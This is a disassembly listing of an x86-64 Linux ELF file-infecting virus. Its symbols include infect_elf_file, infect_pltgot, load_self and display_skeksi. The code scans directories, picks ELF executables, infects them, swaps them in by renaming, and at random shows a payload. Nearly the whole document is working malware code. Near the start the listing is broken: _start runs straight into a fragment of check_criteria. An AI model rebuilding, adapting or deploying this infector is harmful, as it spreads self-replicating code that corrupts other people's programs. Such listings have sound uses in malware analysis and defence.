
virus:     file format elf64-x86-64


Disassembly of section .text:

000000000040019c <_start>:
  40019c:	f3 0f 1e fa          	endbr64 
  401b7f:	8b 45 f0             	mov    eax,DWORD PTR [rbp-0x10]
  401b82:	48 98                	cdqe   
  401b84:	48 8d 8d 40 ef ff ff 	lea    rcx,[rbp-0x10c0]
  401b8b:	ba 00 10 00 00       	mov    edx,0x1000
  401b90:	48 89 ce             	mov    rsi,rcx
  401b93:	48 89 c7             	mov    rdi,rax
  401b96:	e8 2f 05 00 00       	call   4020ca <_read>
  401b9b:	85 c0                	test   eax,eax
  401b9d:	79 0a                	jns    401ba9 <check_criteria+0x7f>
  401b9f:	b8 ff ff ff ff       	mov    eax,0xffffffff
  401ba4:	e9 fd 00 00 00       	jmp    401ca6 <check_criteria+0x17c>
  401ba9:	8b 45 f0             	mov    eax,DWORD PTR [rbp-0x10]
  401bac:	89 c7                	mov    edi,eax
  401bae:	e8 f9 04 00 00       	call   4020ac <_close>
  401bb3:	48 8d 85 40 ef ff ff 	lea    rax,[rbp-0x10c0]
  401bba:	48 89 45 e8          	mov    QWORD PTR [rbp-0x18],rax
  401bbe:	48 8b 45 e8          	mov    rax,QWORD PTR [rbp-0x18]
  401bc2:	48 8b 40 20          	mov    rax,QWORD PTR [rax+0x20]
  401bc6:	48 8d 95 40 ef ff ff 	lea    rdx,[rbp-0x10c0]
  401bcd:	48 01 d0             	add    rax,rdx
  401bd0:	48 89 45 e0          	mov    QWORD PTR [rbp-0x20],rax
  401bd4:	48 8d 85 40 ef ff ff 	lea    rax,[rbp-0x10c0]
  401bdb:	ba 04 00 00 00       	mov    edx,0x4
  401be0:	48 89 c6             	mov    rsi,rax
  401be3:	48 8d 3d 46 12 00 00 	lea    rdi,[rip+0x1246]        # 402e30 <display_skeksi+0xfd>
  401bea:	e8 af 10 00 00       	call   402c9e <_memcmp>
  401bef:	85 c0                	test   eax,eax
  401bf1:	74 0a                	je     401bfd <check_criteria+0xd3>
  401bf3:	b8 ff ff ff ff       	mov    eax,0xffffffff
  401bf8:	e9 a9 00 00 00       	jmp    401ca6 <check_criteria+0x17c>
  401bfd:	48 8b 45 e8          	mov    rax,QWORD PTR [rbp-0x18]
  401c01:	48 83 c0 09          	add    rax,0x9
  401c05:	8b 00                	mov    eax,DWORD PTR [rax]
  401c07:	89 45 dc             	mov    DWORD PTR [rbp-0x24],eax
  401c0a:	81 7d dc 25 5d 01 00 	cmp    DWORD PTR [rbp-0x24],0x15d25
  401c11:	75 0a                	jne    401c1d <check_criteria+0xf3>
  401c13:	b8 ff ff ff ff       	mov    eax,0xffffffff
  401c18:	e9 89 00 00 00       	jmp    401ca6 <check_criteria+0x17c>
  401c1d:	48 8b 45 e8          	mov    rax,QWORD PTR [rbp-0x18]
  401c21:	0f b7 40 10          	movzx  eax,WORD PTR [rax+0x10]
  401c25:	66 83 f8 02          	cmp    ax,0x2
  401c29:	74 07                	je     401c32 <check_criteria+0x108>
  401c2b:	b8 ff ff ff ff       	mov    eax,0xffffffff
  401c30:	eb 74                	jmp    401ca6 <check_criteria+0x17c>
  401c32:	48 8b 45 e8          	mov    rax,QWORD PTR [rbp-0x18]
  401c36:	0f b7 40 12          	movzx  eax,WORD PTR [rax+0x12]
  401c3a:	66 83 f8 3e          	cmp    ax,0x3e
  401c3e:	74 07                	je     401c47 <check_criteria+0x11d>
  401c40:	b8 ff ff ff ff       	mov    eax,0xffffffff
  401c45:	eb 5f                	jmp    401ca6 <check_criteria+0x17c>
  401c47:	c7 45 fc 00 00 00 00 	mov    DWORD PTR [rbp-0x4],0x0
  401c4e:	c7 45 f8 00 00 00 00 	mov    DWORD PTR [rbp-0x8],0x0
  401c55:	eb 2d                	jmp    401c84 <check_criteria+0x15a>
  401c57:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  401c5a:	48 63 d0             	movsxd rdx,eax
  401c5d:	48 89 d0             	mov    rax,rdx
  401c60:	48 c1 e0 03          	shl    rax,0x3
  401c64:	48 29 d0             	sub    rax,rdx
  401c67:	48 c1 e0 03          	shl    rax,0x3
  401c6b:	48 89 c2             	mov    rdx,rax
  401c6e:	48 8b 45 e0          	mov    rax,QWORD PTR [rbp-0x20]
  401c72:	48 01 d0             	add    rax,rdx
  401c75:	8b 00                	mov    eax,DWORD PTR [rax]
  401c77:	83 f8 02             	cmp    eax,0x2
  401c7a:	75 04                	jne    401c80 <check_criteria+0x156>
  401c7c:	83 45 fc 01          	add    DWORD PTR [rbp-0x4],0x1
  401c80:	83 45 f8 01          	add    DWORD PTR [rbp-0x8],0x1
  401c84:	48 8b 45 e8          	mov    rax,QWORD PTR [rbp-0x18]
  401c88:	0f b7 40 38          	movzx  eax,WORD PTR [rax+0x38]
  401c8c:	0f b7 c0             	movzx  eax,ax
  401c8f:	39 45 f8             	cmp    DWORD PTR [rbp-0x8],eax
  401c92:	7c c3                	jl     401c57 <check_criteria+0x12d>
  401c94:	83 7d fc 00          	cmp    DWORD PTR [rbp-0x4],0x0
  401c98:	75 07                	jne    401ca1 <check_criteria+0x177>
  401c9a:	b8 ff ff ff ff       	mov    eax,0xffffffff
  401c9f:	eb 05                	jmp    401ca6 <check_criteria+0x17c>
  401ca1:	b8 00 00 00 00       	mov    eax,0x0
  401ca6:	c9                   	leave  
  401ca7:	c3                   	ret    

0000000000401ca8 <do_main>:
  401ca8:	f3 0f 1e fa          	endbr64 
  401cac:	55                   	push   rbp
  401cad:	48 89 e5             	mov    rbp,rsp
  401cb0:	4c 8d 9c 24 00 80 ff 	lea    r11,[rsp-0x8000]
  401cb7:	ff 
  401cb8:	48 81 ec 00 10 00 00 	sub    rsp,0x1000
  401cbf:	48 83 0c 24 00       	or     QWORD PTR [rsp],0x0
  401cc4:	4c 39 dc             	cmp    rsp,r11
  401cc7:	75 ef                	jne    401cb8 <do_main+0x10>
  401cc9:	48 81 ec 60 03 00 00 	sub    rsp,0x360
  401cd0:	48 89 bd a8 7c ff ff 	mov    QWORD PTR [rbp-0x8358],rdi
  401cd7:	48 c7 45 90 00 00 00 	mov    QWORD PTR [rbp-0x70],0x0
  401cde:	00 
  401cdf:	48 c7 45 e8 00 00 00 	mov    QWORD PTR [rbp-0x18],0x0
  401ce6:	00 
  401ce7:	c7 45 f8 04 00 00 00 	mov    DWORD PTR [rbp-0x8],0x4
  401cee:	c7 45 f4 00 00 00 00 	mov    DWORD PTR [rbp-0xc],0x0
  401cf5:	48 8d 05 39 11 00 00 	lea    rax,[rip+0x1139]        # 402e35 <display_skeksi+0x102>
  401cfc:	48 89 85 e0 7c ff ff 	mov    QWORD PTR [rbp-0x8320],rax
  401d03:	48 8d 05 31 11 00 00 	lea    rax,[rip+0x1131]        # 402e3b <display_skeksi+0x108>
  401d0a:	48 89 85 e8 7c ff ff 	mov    QWORD PTR [rbp-0x8318],rax
  401d11:	48 8d 05 2d 11 00 00 	lea    rax,[rip+0x112d]        # 402e45 <display_skeksi+0x112>
  401d18:	48 89 85 f0 7c ff ff 	mov    QWORD PTR [rbp-0x8310],rax
  401d1f:	48 8d 05 24 11 00 00 	lea    rax,[rip+0x1124]        # 402e4a <display_skeksi+0x117>
  401d26:	48 89 85 f8 7c ff ff 	mov    QWORD PTR [rbp-0x8308],rax
  401d2d:	66 c7 85 de 7c ff ff 	mov    WORD PTR [rbp-0x8322],0x2e
  401d34:	2e 00 
  401d36:	b8 00 00 00 00       	mov    eax,0x0
  401d3b:	e8 f9 02 00 00       	call   402039 <_getuid>
  401d40:	85 c0                	test   eax,eax
  401d42:	74 09                	je     401d4d <do_main+0xa5>
  401d44:	48 8d 85 de 7c ff ff 	lea    rax,[rbp-0x8322]
  401d4b:	eb 0f                	jmp    401d5c <do_main+0xb4>
  401d4d:	48 8d 85 e0 7c ff ff 	lea    rax,[rbp-0x8320]
  401d54:	48 89 c7             	mov    rdi,rax
  401d57:	e8 00 e7 ff ff       	call   40045c <randomly_select_dir>
  401d5c:	48 89 45 e8          	mov    QWORD PTR [rbp-0x18],rax
  401d60:	48 8b 45 e8          	mov    rax,QWORD PTR [rbp-0x18]
  401d64:	48 8d 35 e8 10 00 00 	lea    rsi,[rip+0x10e8]        # 402e53 <display_skeksi+0x120>
  401d6b:	48 89 c7             	mov    rdi,rax
  401d6e:	e8 cb 0e 00 00       	call   402c3e <_strcmp>
  401d73:	85 c0                	test   eax,eax
  401d75:	75 07                	jne    401d7e <do_main+0xd6>
  401d77:	c7 45 f8 01 00 00 00 	mov    DWORD PTR [rbp-0x8],0x1
  401d7e:	48 8b 45 e8          	mov    rax,QWORD PTR [rbp-0x18]
  401d82:	ba 00 00 00 00       	mov    edx,0x0
  401d87:	be 00 00 01 00       	mov    esi,0x10000
  401d8c:	48 89 c7             	mov    rdi,rax
  401d8f:	e8 e2 02 00 00       	call   402076 <_open>
  401d94:	89 45 e4             	mov    DWORD PTR [rbp-0x1c],eax
  401d97:	83 7d e4 00          	cmp    DWORD PTR [rbp-0x1c],0x0
  401d9b:	0f 88 92 02 00 00    	js     402033 <do_main+0x38b>
  401da1:	48 8d 85 00 7e ff ff 	lea    rax,[rbp-0x8200]
  401da8:	48 89 c7             	mov    rdi,rax
  401dab:	e8 92 f0 ff ff       	call   400e42 <load_self>
  401db0:	8b 45 e4             	mov    eax,DWORD PTR [rbp-0x1c]
  401db3:	48 8d 8d 90 7f ff ff 	lea    rcx,[rbp-0x8070]
  401dba:	ba 00 80 00 00       	mov    edx,0x8000
  401dbf:	48 89 ce             	mov    rsi,rcx
  401dc2:	89 c7                	mov    edi,eax
  401dc4:	e8 92 05 00 00       	call   40235b <_getdents64>
  401dc9:	89 45 e0             	mov    DWORD PTR [rbp-0x20],eax
  401dcc:	83 7d e0 00          	cmp    DWORD PTR [rbp-0x20],0x0
  401dd0:	0f 88 60 02 00 00    	js     402036 <do_main+0x38e>
  401dd6:	83 7d e0 00          	cmp    DWORD PTR [rbp-0x20],0x0
  401dda:	0f 84 f5 01 00 00    	je     401fd5 <do_main+0x32d>
  401de0:	c7 45 dc 00 00 00 00 	mov    DWORD PTR [rbp-0x24],0x0
  401de7:	c7 45 fc 00 00 00 00 	mov    DWORD PTR [rbp-0x4],0x0
  401dee:	e9 d1 01 00 00       	jmp    401fc4 <do_main+0x31c>
  401df3:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  401df6:	48 98                	cdqe   
  401df8:	48 8d 95 90 7f ff ff 	lea    rdx,[rbp-0x8070]
  401dff:	48 01 d0             	add    rax,rdx
  401e02:	48 89 45 d0          	mov    QWORD PTR [rbp-0x30],rax
  401e06:	48 8b 45 d0          	mov    rax,QWORD PTR [rbp-0x30]
  401e0a:	0f b7 40 10          	movzx  eax,WORD PTR [rax+0x10]
  401e0e:	0f b7 c0             	movzx  eax,ax
  401e11:	83 e8 01             	sub    eax,0x1
  401e14:	01 45 fc             	add    DWORD PTR [rbp-0x4],eax
  401e17:	48 8b 45 d0          	mov    rax,QWORD PTR [rbp-0x30]
  401e1b:	48 83 c0 13          	add    rax,0x13
  401e1f:	48 8d 35 2f 10 00 00 	lea    rsi,[rip+0x102f]        # 402e55 <display_skeksi+0x122>
  401e26:	48 89 c7             	mov    rdi,rax
  401e29:	e8 10 0e 00 00       	call   402c3e <_strcmp>
  401e2e:	85 c0                	test   eax,eax
  401e30:	0f 84 80 01 00 00    	je     401fb6 <do_main+0x30e>
  401e36:	48 8b 45 d0          	mov    rax,QWORD PTR [rbp-0x30]
  401e3a:	0f b6 40 13          	movzx  eax,BYTE PTR [rax+0x13]
  401e3e:	3c 2e                	cmp    al,0x2e
  401e40:	0f 84 73 01 00 00    	je     401fb9 <do_main+0x311>
  401e46:	48 8b 45 d0          	mov    rax,QWORD PTR [rbp-0x30]
  401e4a:	48 8d 48 13          	lea    rcx,[rax+0x13]
  401e4e:	48 8d 55 90          	lea    rdx,[rbp-0x70]
  401e52:	48 8b 45 e8          	mov    rax,QWORD PTR [rbp-0x18]
  401e56:	48 89 c6             	mov    rsi,rax
  401e59:	48 89 cf             	mov    rdi,rcx
  401e5c:	e8 4b e6 ff ff       	call   4004ac <full_path>
  401e61:	48 89 45 c8          	mov    QWORD PTR [rbp-0x38],rax
  401e65:	48 8b 45 c8          	mov    rax,QWORD PTR [rbp-0x38]
  401e69:	48 89 c7             	mov    rdi,rax
  401e6c:	e8 b9 fc ff ff       	call   401b2a <check_criteria>
  401e71:	85 c0                	test   eax,eax
  401e73:	0f 88 43 01 00 00    	js     401fbc <do_main+0x314>
  401e79:	83 7d f4 00          	cmp    DWORD PTR [rbp-0xc],0x0
  401e7d:	74 43                	je     401ec2 <do_main+0x21a>
  401e7f:	c7 45 9c 0a 00 00 00 	mov    DWORD PTR [rbp-0x64],0xa
  401e86:	48 8d 85 b0 7c ff ff 	lea    rax,[rbp-0x8350]
  401e8d:	be 00 00 00 00       	mov    esi,0x0
  401e92:	48 89 c7             	mov    rdi,rax
  401e95:	e8 f5 04 00 00       	call   40238f <_gettimeofday>
  401e9a:	48 8d 85 b0 7c ff ff 	lea    rax,[rbp-0x8350]
  401ea1:	48 83 c0 08          	add    rax,0x8
  401ea5:	48 89 c7             	mov    rdi,rax
  401ea8:	e8 6b e5 ff ff       	call   400418 <_rand>
  401ead:	99                   	cdq    
  401eae:	f7 7d 9c             	idiv   DWORD PTR [rbp-0x64]
  401eb1:	89 d0                	mov    eax,edx
  401eb3:	89 45 c4             	mov    DWORD PTR [rbp-0x3c],eax
  401eb6:	83 7d c4 07          	cmp    DWORD PTR [rbp-0x3c],0x7
  401eba:	0f 85 ff 00 00 00    	jne    401fbf <do_main+0x317>
  401ec0:	eb 01                	jmp    401ec3 <do_main+0x21b>
  401ec2:	90                   	nop
  401ec3:	48 8d 95 00 7d ff ff 	lea    rdx,[rbp-0x8300]
  401eca:	48 8b 45 c8          	mov    rax,QWORD PTR [rbp-0x38]
  401ece:	48 89 d6             	mov    rsi,rdx
  401ed1:	48 89 c7             	mov    rdi,rax
  401ed4:	e8 8a f0 ff ff       	call   400f63 <load_target>
  401ed9:	48 8d 95 00 7d ff ff 	lea    rdx,[rbp-0x8300]
  401ee0:	48 8d 85 00 7e ff ff 	lea    rax,[rbp-0x8200]
  401ee7:	48 89 d6             	mov    rsi,rdx
  401eea:	48 89 c7             	mov    rdi,rax
  401eed:	e8 6c e9 ff ff       	call   40085e <infect_elf_file>
  401ef2:	48 89 45 b8          	mov    QWORD PTR [rbp-0x48],rax
  401ef6:	48 8d 85 00 7d ff ff 	lea    rax,[rbp-0x8300]
  401efd:	48 89 c7             	mov    rdi,rax
  401f00:	e8 1f f0 ff ff       	call   400f24 <unload_target>
  401f05:	48 8d 85 00 7d ff ff 	lea    rax,[rbp-0x8300]
  401f0c:	48 89 c6             	mov    rsi,rax
  401f0f:	48 8d 3d 9a 0e 00 00 	lea    rdi,[rip+0xe9a]        # 402db0 <display_skeksi+0x7d>
  401f16:	e8 5f f4 ff ff       	call   40137a <load_target_writeable>
  401f1b:	e8 d7 0d 00 00       	call   402cf7 <get_rip>
  401f20:	48 c7 c2 04 2d 40 00 	mov    rdx,0x402d04
  401f27:	48 89 d1             	mov    rcx,rdx
  401f2a:	48 c7 c2 9c 01 40 00 	mov    rdx,0x40019c
  401f31:	48 29 d1             	sub    rcx,rdx
  401f34:	48 89 ca             	mov    rdx,rcx
  401f37:	48 29 d0             	sub    rax,rdx
  401f3a:	48 89 45 b0          	mov    QWORD PTR [rbp-0x50],rax
  401f3e:	e8 b4 0d 00 00       	call   402cf7 <get_rip>
  401f43:	48 c7 c2 04 2d 40 00 	mov    rdx,0x402d04
  401f4a:	48 89 d1             	mov    rcx,rdx
  401f4d:	48 c7 c2 e1 01 40 00 	mov    rdx,0x4001e1
  401f54:	48 29 d1             	sub    rcx,rdx
  401f57:	48 89 ca             	mov    rdx,rcx
  401f5a:	48 29 d0             	sub    rax,rdx
  401f5d:	48 89 45 a8          	mov    QWORD PTR [rbp-0x58],rax
  401f61:	48 8b 45 a8          	mov    rax,QWORD PTR [rbp-0x58]
  401f65:	48 2b 45 b0          	sub    rax,QWORD PTR [rbp-0x50]
  401f69:	48 89 45 a0          	mov    QWORD PTR [rbp-0x60],rax
  401f6d:	48 8b 55 b8          	mov    rdx,QWORD PTR [rbp-0x48]
  401f71:	48 8b 45 a0          	mov    rax,QWORD PTR [rbp-0x60]
  401f75:	48 01 d0             	add    rax,rdx
  401f78:	48 8d 50 40          	lea    rdx,[rax+0x40]
  401f7c:	48 8d 85 00 7d ff ff 	lea    rax,[rbp-0x8300]
  401f83:	48 89 d6             	mov    rsi,rdx
  401f86:	48 89 c7             	mov    rdi,rax
  401f89:	e8 03 f8 ff ff       	call   401791 <infect_pltgot>
  401f8e:	48 8d 85 00 7d ff ff 	lea    rax,[rbp-0x8300]
  401f95:	48 89 c7             	mov    rdi,rax
  401f98:	e8 87 ef ff ff       	call   400f24 <unload_target>
  401f9d:	48 8b 45 c8          	mov    rax,QWORD PTR [rbp-0x38]
  401fa1:	48 89 c6             	mov    rsi,rax
  401fa4:	48 8d 3d 05 0e 00 00 	lea    rdi,[rip+0xe05]        # 402db0 <display_skeksi+0x7d>
  401fab:	e8 da 01 00 00       	call   40218a <_rename>
  401fb0:	83 45 f4 01          	add    DWORD PTR [rbp-0xc],0x1
  401fb4:	eb 0a                	jmp    401fc0 <do_main+0x318>
  401fb6:	90                   	nop
  401fb7:	eb 07                	jmp    401fc0 <do_main+0x318>
  401fb9:	90                   	nop
  401fba:	eb 04                	jmp    401fc0 <do_main+0x318>
  401fbc:	90                   	nop
  401fbd:	eb 01                	jmp    401fc0 <do_main+0x318>
  401fbf:	90                   	nop
  401fc0:	83 45 fc 01          	add    DWORD PTR [rbp-0x4],0x1
  401fc4:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  401fc7:	3b 45 e0             	cmp    eax,DWORD PTR [rbp-0x20]
  401fca:	0f 8c 23 fe ff ff    	jl     401df3 <do_main+0x14b>
  401fd0:	e9 db fd ff ff       	jmp    401db0 <do_main+0x108>
  401fd5:	90                   	nop
  401fd6:	83 6d f8 01          	sub    DWORD PTR [rbp-0x8],0x1
  401fda:	83 7d f8 00          	cmp    DWORD PTR [rbp-0x8],0x0
  401fde:	7e 0f                	jle    401fef <do_main+0x347>
  401fe0:	8b 45 e4             	mov    eax,DWORD PTR [rbp-0x1c]
  401fe3:	89 c7                	mov    edi,eax
  401fe5:	e8 c2 00 00 00       	call   4020ac <_close>
  401fea:	e9 47 fd ff ff       	jmp    401d36 <do_main+0x8e>
  401fef:	c7 45 98 32 00 00 00 	mov    DWORD PTR [rbp-0x68],0x32
  401ff6:	48 8d 85 c0 7c ff ff 	lea    rax,[rbp-0x8340]
  401ffd:	be 00 00 00 00       	mov    esi,0x0
  402002:	48 89 c7             	mov    rdi,rax
  402005:	e8 85 03 00 00       	call   40238f <_gettimeofday>
  40200a:	48 8d 85 c0 7c ff ff 	lea    rax,[rbp-0x8340]
  402011:	48 83 c0 08          	add    rax,0x8
  402015:	48 89 c7             	mov    rdi,rax
  402018:	e8 fb e3 ff ff       	call   400418 <_rand>
  40201d:	99                   	cdq    
  40201e:	f7 7d 98             	idiv   DWORD PTR [rbp-0x68]
  402021:	89 d0                	mov    eax,edx
  402023:	89 45 c4             	mov    DWORD PTR [rbp-0x3c],eax
  402026:	83 7d c4 07          	cmp    DWORD PTR [rbp-0x3c],0x7
  40202a:	75 0b                	jne    402037 <do_main+0x38f>
  40202c:	e8 02 0d 00 00       	call   402d33 <display_skeksi>
  402031:	eb 04                	jmp    402037 <do_main+0x38f>
  402033:	90                   	nop
  402034:	eb 01                	jmp    402037 <do_main+0x38f>
  402036:	90                   	nop
  402037:	c9                   	leave  
  402038:	c3                   	ret    

0000000000402039 <_getuid>:
  402039:	f3 0f 1e fa          	endbr64 
  40203d:	55                   	push   rbp
  40203e:	48 89 e5             	mov    rbp,rsp
  402041:	48 c7 c0 66 00 00 00 	mov    rax,0x66
  402048:	0f 05                	syscall 
  40204a:	48 89 c0             	mov    rax,rax
  40204d:	48 89 45 f8          	mov    QWORD PTR [rbp-0x8],rax
  402051:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  402055:	5d                   	pop    rbp
  402056:	c3                   	ret    

0000000000402057 <Exit>:
  402057:	f3 0f 1e fa          	endbr64 
  40205b:	55                   	push   rbp
  40205c:	48 89 e5             	mov    rbp,rsp
  40205f:	48 89 7d f8          	mov    QWORD PTR [rbp-0x8],rdi
  402063:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  402067:	48 89 c7             	mov    rdi,rax
  40206a:	48 c7 c0 3c 00 00 00 	mov    rax,0x3c
  402071:	0f 05                	syscall 
  402073:	90                   	nop
  402074:	5d                   	pop    rbp
  402075:	c3                   	ret    

0000000000402076 <_open>:
  402076:	f3 0f 1e fa          	endbr64 
  40207a:	55                   	push   rbp
  40207b:	48 89 e5             	mov    rbp,rsp
  40207e:	48 89 7d e8          	mov    QWORD PTR [rbp-0x18],rdi
  402082:	48 89 75 e0          	mov    QWORD PTR [rbp-0x20],rsi
  402086:	48 89 55 d8          	mov    QWORD PTR [rbp-0x28],rdx
  40208a:	48 8b 7d e8          	mov    rdi,QWORD PTR [rbp-0x18]
  40208e:	48 8b 75 e0          	mov    rsi,QWORD PTR [rbp-0x20]
  402092:	48 8b 55 d8          	mov    rdx,QWORD PTR [rbp-0x28]
  402096:	48 c7 c0 02 00 00 00 	mov    rax,0x2
  40209d:	0f 05                	syscall 
  40209f:	48 89 c0             	mov    rax,rax
  4020a2:	48 89 45 f8          	mov    QWORD PTR [rbp-0x8],rax
  4020a6:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  4020aa:	5d                   	pop    rbp
  4020ab:	c3                   	ret    

00000000004020ac <_close>:
  4020ac:	f3 0f 1e fa          	endbr64 
  4020b0:	55                   	push   rbp
  4020b1:	48 89 e5             	mov    rbp,rsp
  4020b4:	89 7d ec             	mov    DWORD PTR [rbp-0x14],edi
  4020b7:	48 8b 7d ec          	mov    rdi,QWORD PTR [rbp-0x14]
  4020bb:	48 c7 c0 03 00 00 00 	mov    rax,0x3
  4020c2:	0f 05                	syscall 
  4020c4:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  4020c8:	5d                   	pop    rbp
  4020c9:	c3                   	ret    

00000000004020ca <_read>:
  4020ca:	f3 0f 1e fa          	endbr64 
  4020ce:	55                   	push   rbp
  4020cf:	48 89 e5             	mov    rbp,rsp
  4020d2:	48 89 7d e8          	mov    QWORD PTR [rbp-0x18],rdi
  4020d6:	48 89 75 e0          	mov    QWORD PTR [rbp-0x20],rsi
  4020da:	48 89 55 d8          	mov    QWORD PTR [rbp-0x28],rdx
  4020de:	48 8b 7d e8          	mov    rdi,QWORD PTR [rbp-0x18]
  4020e2:	48 8b 75 e0          	mov    rsi,QWORD PTR [rbp-0x20]
  4020e6:	48 8b 55 d8          	mov    rdx,QWORD PTR [rbp-0x28]
  4020ea:	48 c7 c0 00 00 00 00 	mov    rax,0x0
  4020f1:	0f 05                	syscall 
  4020f3:	48 89 c0             	mov    rax,rax
  4020f6:	48 89 45 f8          	mov    QWORD PTR [rbp-0x8],rax
  4020fa:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  4020fe:	5d                   	pop    rbp
  4020ff:	c3                   	ret    

0000000000402100 <_write>:
  402100:	f3 0f 1e fa          	endbr64 
  402104:	55                   	push   rbp
  402105:	48 89 e5             	mov    rbp,rsp
  402108:	48 89 7d e8          	mov    QWORD PTR [rbp-0x18],rdi
  40210c:	48 89 75 e0          	mov    QWORD PTR [rbp-0x20],rsi
  402110:	48 89 55 d8          	mov    QWORD PTR [rbp-0x28],rdx
  402114:	48 8b 7d e8          	mov    rdi,QWORD PTR [rbp-0x18]
  402118:	48 8b 75 e0          	mov    rsi,QWORD PTR [rbp-0x20]
  40211c:	48 8b 55 d8          	mov    rdx,QWORD PTR [rbp-0x28]
  402120:	48 c7 c0 01 00 00 00 	mov    rax,0x1
  402127:	0f 05                	syscall 
  402129:	48 89 c0             	mov    rax,rax
  40212c:	48 89 45 f8          	mov    QWORD PTR [rbp-0x8],rax
  402130:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  402134:	5d                   	pop    rbp
  402135:	c3                   	ret    

0000000000402136 <_fstat>:
  402136:	f3 0f 1e fa          	endbr64 
  40213a:	55                   	push   rbp
  40213b:	48 89 e5             	mov    rbp,rsp
  40213e:	48 89 7d e8          	mov    QWORD PTR [rbp-0x18],rdi
  402142:	48 89 75 e0          	mov    QWORD PTR [rbp-0x20],rsi
  402146:	48 8b 7d e8          	mov    rdi,QWORD PTR [rbp-0x18]
  40214a:	48 8b 75 e0          	mov    rsi,QWORD PTR [rbp-0x20]
  40214e:	48 c7 c0 05 00 00 00 	mov    rax,0x5
  402155:	0f 05                	syscall 
  402157:	48 89 c0             	mov    rax,rax
  40215a:	48 89 45 f8          	mov    QWORD PTR [rbp-0x8],rax
  40215e:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  402162:	5d                   	pop    rbp
  402163:	c3                   	ret    

0000000000402164 <_unlink>:
  402164:	f3 0f 1e fa          	endbr64 
  402168:	55                   	push   rbp
  402169:	48 89 e5             	mov    rbp,rsp
  40216c:	48 89 7d e8          	mov    QWORD PTR [rbp-0x18],rdi
  402170:	48 8b 7d e8          	mov    rdi,QWORD PTR [rbp-0x18]
  402174:	48 c7 c0 57 00 00 00 	mov    rax,0x57
  40217b:	0f 05                	syscall 
  40217d:	48 89 c0             	mov    rax,rax
  402180:	48 89 45 f8          	mov    QWORD PTR [rbp-0x8],rax
  402184:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  402188:	5d                   	pop    rbp
  402189:	c3                   	ret    

000000000040218a <_rename>:
  40218a:	f3 0f 1e fa          	endbr64 
  40218e:	55                   	push   rbp
  40218f:	48 89 e5             	mov    rbp,rsp
  402192:	48 89 7d e8          	mov    QWORD PTR [rbp-0x18],rdi
  402196:	48 89 75 e0          	mov    QWORD PTR [rbp-0x20],rsi
  40219a:	48 8b 7d e8          	mov    rdi,QWORD PTR [rbp-0x18]
  40219e:	48 8b 75 e0          	mov    rsi,QWORD PTR [rbp-0x20]
  4021a2:	48 c7 c0 52 00 00 00 	mov    rax,0x52
  4021a9:	0f 05                	syscall 
  4021ab:	48 89 c0             	mov    rax,rax
  4021ae:	48 89 45 f8          	mov    QWORD PTR [rbp-0x8],rax
  4021b2:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  4021b6:	5d                   	pop    rbp
  4021b7:	c3                   	ret    

00000000004021b8 <_lseek>:
  4021b8:	f3 0f 1e fa          	endbr64 
  4021bc:	55                   	push   rbp
  4021bd:	48 89 e5             	mov    rbp,rsp
  4021c0:	48 89 7d e8          	mov    QWORD PTR [rbp-0x18],rdi
  4021c4:	48 89 75 e0          	mov    QWORD PTR [rbp-0x20],rsi
  4021c8:	89 55 dc             	mov    DWORD PTR [rbp-0x24],edx
  4021cb:	48 8b 7d e8          	mov    rdi,QWORD PTR [rbp-0x18]
  4021cf:	48 8b 75 e0          	mov    rsi,QWORD PTR [rbp-0x20]
  4021d3:	48 8b 55 dc          	mov    rdx,QWORD PTR [rbp-0x24]
  4021d7:	48 c7 c0 08 00 00 00 	mov    rax,0x8
  4021de:	0f 05                	syscall 
  4021e0:	48 89 c0             	mov    rax,rax
  4021e3:	48 89 45 f8          	mov    QWORD PTR [rbp-0x8],rax
  4021e7:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  4021eb:	5d                   	pop    rbp
  4021ec:	c3                   	ret    

